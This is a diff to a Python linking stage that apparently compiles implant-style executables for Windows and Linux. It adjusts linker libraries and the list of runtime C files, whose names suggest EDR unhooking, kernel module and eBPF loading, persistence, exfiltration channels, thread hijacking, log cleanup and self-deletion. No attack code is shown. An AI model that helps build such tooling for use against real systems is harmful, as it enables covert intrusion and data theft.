@@ -46,7 +46,7 @@ class LinkStage(Stage):
                 str(tc.clang()), "--target=x86_64-pc-windows-gnu",
                 f"-L{mingw_lib}", str(obj_path)
             ] + runtime_objs + [
-                "-lkernel32", "-luser32", "-ladvapi32", "-lws2_32", "-lwinhttp", "-ldnsapi",
+                "-lkernel32", "-luser32", "-ladvapi32", "-lws2_32", "-lwinhttp", "-lwininet", "-ldnsapi",
                 "-o", str(output)
             ]
             run_cmd(link_cmd, "Linking Windows PE executable (clang)")
@@ -98,7 +98,6 @@ class LinkStage(Stage):
                 runtime_dir / "util"         / "mem.c",
                 runtime_dir / "windows"      / "windows_utils.c",
                 runtime_dir / "windows"      / "windows_api_impl.c",
-                runtime_dir / "windows"      / "network" / "http.c",
                 runtime_dir / "windows"      / "registry" / "registry.c",
                 runtime_dir / "evasion"      / "unhook.c",
                 runtime_dir / "evasion"      / "syscalls.c",
@@ -120,6 +119,8 @@ class LinkStage(Stage):
         if target_os == "linux":
             linux_potential = [
                 runtime_dir / "util"                    / "mem.c",
+                runtime_dir / "util"                    / "strings.c",
+                runtime_dir / "util"                    / "process.c",
                 runtime_dir / "compression"             / "compression.c",
                 runtime_dir / "common"                  / "encoding.c",
                 runtime_dir / "forensics"               / "forensic_api_impl.c",
@@ -128,13 +129,10 @@ class LinkStage(Stage):
                 runtime_dir / "linux"                   / "syscalls" / "env_syscall.c",
                 runtime_dir / "linux"                   / "syscalls" / "file_syscall.c",
                 runtime_dir / "linux"                   / "syscalls" / "dir_syscall.c",
-                runtime_dir / "linux"                   / "core" / "runtime_init.c",
-                runtime_dir / "linux"                   / "core" / "sandbox_ops.c",
-                runtime_dir / "linux"                   / "core" / "audit_ops.c",
                 runtime_dir / "linux"                   / "kernel" / "lkm_loader.c",
                 runtime_dir / "linux"                   / "kernel" / "ebpf_loader.c",
-                runtime_dir / "linux"                   / "kernel" / "module_ops.c",
                 runtime_dir / "linux"                   / "kernel" / "modules.c",
+                runtime_dir / "linux"                   / "kernel" / "module_ops.c",
                 runtime_dir / "linux"                   / "kernel" / "module_loader.c",
                 runtime_dir / "linux"                   / "persistence.c",
                 runtime_dir / "linux"                   / "exfil" / "exfil_channels.c",
@@ -145,7 +143,6 @@ class LinkStage(Stage):
                 runtime_dir / "linux"                   / "forensics" / "cleanup.c",
                 runtime_dir / "linux"                   / "process" / "ptrace_control.c",
                 runtime_dir / "linux"                   / "process" / "thread_hijack.c",
-                runtime_dir / "windows"                 / "network" / "http.c",
                 runtime_dir / "evasion"                 / "unhook.c",
                 runtime_dir / "cleanup"                 / "self_delete.c",
                 runtime_dir / "cleanup"                 / "logs.c",
